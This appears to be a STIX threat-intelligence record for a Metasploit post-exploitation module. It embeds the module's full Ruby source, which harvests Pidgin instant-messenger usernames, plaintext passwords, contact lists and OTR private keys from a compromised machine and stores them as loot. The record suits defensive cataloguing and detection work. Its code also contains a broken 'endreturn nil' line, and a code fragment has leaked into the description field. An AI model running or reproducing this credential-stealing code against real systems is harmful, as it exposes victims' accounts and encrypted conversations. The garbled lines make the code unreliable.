{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c52dcb0c-785c-4bdc-b6be-f9d12bb2fb8b",
    "created": "2024-08-14T16:33:19.187671Z",
    "modified": "2024-08-14T16:33:19.187674Z",
    "name": "Multi Gather Pidgin Instant Messenger Credential Collection",
    "description": " This module will collect credentials from the Pidgin IM client if it is installed.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/pidgin_cred.rb",
            "external_id": "pidgin_cred.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Pidgin Instant Messenger Credential Collection',\n        'Description' => %q{\n          This module will collect credentials from the Pidgin IM client if it is installed.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bannedit', # post port, added support for shell sessions\n          'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script\n        ],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => ['shell', 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptBool.new('CONTACTS', [false, 'Collect contact lists?', false]),\n        # Not supported yet OptBool.new('LOGS', [false, 'Gather log files?', false]),\n      ]\n    )\n  end\n\n  # TODO: add support for collecting logs\n  def run\n    paths = []\n    case session.platform\n    when 'unix', 'linux', 'bsd'\n      @platform = :unix\n      paths = enum_users_unix\n    when 'osx'\n      @platform = :osx\n      paths = enum_users_unix\n    when 'windows'\n      @platform = :windows\n      profiles = grab_user_profiles\n      profiles.each do |user|\n        next if user['AppData'].nil?\n\n        pdir = check_pidgin(user['AppData'])\n        paths << pdir if pdir\n      end\n    else\n      print_error \"Unsupported platform #{session.platform}\"\n      return\n    end\n    if paths.nil? || paths.empty?\n      print_status('No users found with a .purple directory')\n      return\n    end\n\n    get_pidgin_creds(paths)\n  end\n\n  def enum_users_unix\n    if @platform == :osx\n      home = '/Users/'\n    else\n      home = '/home/'\n    end\n\n    if got_root?\n      userdirs = session.shell_command(\"ls #{home}\").gsub(/\\s/, \"\\n\")\n      userdirs << \"/root\\n\"\n    else\n      userdirs = session.shell_command(\"ls #{home}#{whoami}/.purple\")\n      if userdirs =~ /No such file/i\n        return\n      else\n        print_status(\"Found Pidgin profile for: #{whoami}\")\n        return [\"#{home}#{whoami}/.purple\"]\n      end\n    end\n\n    paths = Array.new\n    userdirs.each_line do |dir|\n      dir.chomp!\n      next if dir == '.' || dir == '..'\n\n      dir = \"#{home}#{dir}\" if dir !~ /root/\n      print_status(\"Checking for Pidgin profile in: #{dir}\")\n\n      stat = session.shell_command(\"ls #{dir}/.purple\")\n      next if stat =~ /No such file/i\n\n      paths << \"#{dir}/.purple\"\n    end\n    return paths\n  end\n\n  def check_pidgin(purpledir)\n    path = ''\n    print_status(\"Checking for Pidgin profile in: #{purpledir}\")\n    session.fs.dir.foreach(purpledir) do |dir|\n      if dir =~ /\\.purple/\n        if @platform == :windows\n          print_status(\"Found #{purpledir}\\\\#{dir}\")\n          path = \"#{purpledir}\\\\#{dir}\"\n        else\n          print_status(\"Found #{purpledir}/#{dir}\")\n          path = \"#{purpledir}/#{dir}\"\n        end\n        return path\n      end\n    end\n    return nil\n    endreturn nil\n  end\n\n  def get_pidgin_creds(paths)\n    case paths\n    when /#{@user}\\\\(.*)\\\\/\n      sys_user = ::Regexp.last_match(1)\n    when %r{home/(.*)/}\n      sys_user = ::Regexp.last_match(1)\n    end\n\n    data = ''\n    credentials = Rex::Text::Table.new(\n      'Header' => 'Pidgin Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'System User',\n        'Username',\n        'Password',\n        'Protocol',\n        'Server',\n        'Port'\n      ]\n    )\n\n    buddylists = Rex::Text::Table.new(\n      'Header' => 'Pidgin Contact List',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'System User',\n        'Buddy Name',\n        'Alias',\n        'Protocol',\n        'Account'\n      ]\n    )\n\n    paths.each do |path|\n      print_status(\"Reading accounts.xml file from #{path}\")\n      if session.type == 'shell'\n        type = :shell\n        data = session.shell_command(\"cat #{path}/accounts.xml\")\n      else\n        type = :meterp\n        accounts = session.fs.file.new(\"#{path}\\\\accounts.xml\", 'rb')\n        data << accounts.read until accounts.eof?\n      end\n\n      creds = parse_accounts(data)\n\n      if datastore['CONTACTS']\n        blist = ''\n        case type\n        when :shell\n          blist = session.shell_command(\"cat #{path}/blist.xml\")\n        when :meterp\n          buddyxml = session.fs.file.new(\"#{path}/blist.xml\", 'rb')\n          blist << buddyxml.read until buddyxml.eof?\n        end\n\n        buddies = parse_buddies(blist)\n      end\n\n      creds.each do |cred|\n        credentials << [sys_user, cred['user'], cred['password'], cred['protocol'], cred['server'], cred['port']]\n      end\n\n      if buddies\n        buddies.each do |buddy|\n          buddylists << [sys_user, buddy['name'], buddy['alias'], buddy['protocol'], buddy['account']]\n        end\n      end\n\n      # Grab otr.private_key\n      otr_key = ''\n      if session.type == 'shell'\n        otr_key = session.shell_command(\"cat #{path}/otr.private_key\")\n      else\n        key_file = \"#{path}/otr.private_key\"\n        otrkey = begin\n          session.fs.file.stat(key_file)\n        rescue StandardError\n          nil\n        end\n        if otrkey\n          f = session.fs.file.new(key_file, 'rb')\n          otr_key << f.read until f.eof?\n        else\n          otr_key = 'No such file'\n        end\n      end\n\n      if otr_key !~ /No such file/\n        store_loot('otr.private_key', 'text/plain', session, otr_key.to_s, 'otr.private_key', 'otr.private_key')\n        print_good(\"OTR Key: #{otr_key}\")\n      end\n    end\n\n    if datastore['CONTACTS']\n      store_loot('pidgin.contacts', 'text/plain', session, buddylists.to_csv, 'pidgin_contactlists.txt', 'Pidgin Contacts')\n    end\n\n    store_loot('pidgin.creds', 'text/plain', session, credentials.to_csv, 'pidgin_credentials.txt', 'Pidgin Credentials')\n  end\n\n  def parse_accounts(data)\n    creds = []\n    doc = REXML::Document.new(data).root\n\n    doc.elements.each('account') do |sub|\n      account = {}\n      if sub.elements['password']\n        account['password'] = sub.elements['password'].text\n      else\n        account['password'] = '<unknown>'\n      end\n\n      account['protocol'] = begin\n        sub.elements['protocol'].text\n      rescue StandardError\n        '<unknown>'\n      end\n      account['user'] = begin\n        sub.elements['name'].text\n      rescue StandardError\n        '<unknown>'\n      end\n      account['server'] = begin\n        sub.elements['settings'].elements[\"setting[@name='server']\"].text\n      rescue StandardError\n        '<unknown>'\n      end\n      account['port'] = begin\n        sub.elements['settings'].elements[\"setting[@name='port']\"].text\n      rescue StandardError\n        '<unknown>'\n      end\n      creds << account\n\n      print_status('Collected the following credentials:')\n      print_status('    Server: %s:%s' % [account['server'], account['port']])\n      print_status('    Protocol: %s' % account['protocol'])\n      print_status('    Username: %s' % account['user'])\n      print_status('    Password: %s' % account['password'])\n      print_line('')\n    end\n\n    return creds\n  end\n\n  def parse_buddies(data)\n    buddies = []\n\n    doc = REXML::Document.new(data).root\n    doc.elements['blist'].elements.each('group') do |group|\n      group.elements.each('contact') do |bcontact|\n        contact = {}\n        contact['name'] = begin\n          bcontact.elements['buddy'].elements['name'].text\n        rescue StandardError\n          '<unknown>'\n        end\n        contact['account'] = begin\n          bcontact.elements['buddy'].attributes['account']\n        rescue StandardError\n          '<unknown>'\n        end\n        contact['protocol'] = begin\n          bcontact.elements['buddy'].attributes['proto']\n        rescue StandardError\n          '<unknown>'\n        end\n\n        if bcontact.elements['buddy'].elements['alias']\n          contact['alias'] = bcontact.elements['buddy'].elements['alias'].text\n        else\n          contact['alias'] = '<unknown>'\n        end\n\n        buddies << contact\n        print_status('Collected the following contacts:')\n        print_status('    Buddy Name: %s' % contact['name'])\n        print_status('    Alias: %s' % contact['alias'])\n        print_status('    Protocol: %s' % contact['protocol'])\n        print_status('    Account: %s' % contact['account'])\n        print_line('')\n      end\n    end\n\n    return buddies\n  end\n\n  def got_root?\n    case @platform\n    when :windows\n      if session.sys.config.getuid =~ /SYSTEM/\n        return true\n      else\n        return false\n      end\n    else # unix, bsd, linux, osx\n      ret = whoami\n      if ret =~ /root/\n        return true\n      else\n        return false\n      end\n    end\n  end\n\n  def whoami\n    if @platform == :windows\n      session.sys.config.getenv('USERNAME')\n    else\n      session.shell_command('whoami').chomp\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}